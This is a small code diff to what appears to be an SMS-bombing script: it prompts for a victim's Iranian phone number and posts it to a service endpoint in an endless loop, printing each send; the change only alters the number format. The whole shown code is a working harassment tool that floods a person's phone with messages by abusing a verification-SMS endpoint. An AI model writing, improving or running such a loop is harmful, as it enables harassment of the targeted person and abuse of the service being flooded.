@@ -15,9 +15,9 @@ print(f"{red} [1]"+ f"{blue} start")
 print(f"{red} [2]"+ f"{blue} exit")
 king = int(input(f"{red} [~]"+ f"{green} Bad_boy==>"))
 if king == 1:
-    hacker = input("Enter phone Number (9++++++) : ")
+    hacker = input("Enter phone Number (+989++++++) : ")
     while True:
-              requests.post(url,data={"cellphone":"+98"+hacker})
+              requests.post(url,data={"cellphone":hacker})
               print("sended to =>", hacker)
 elif king == 2:
     os.system("clear")
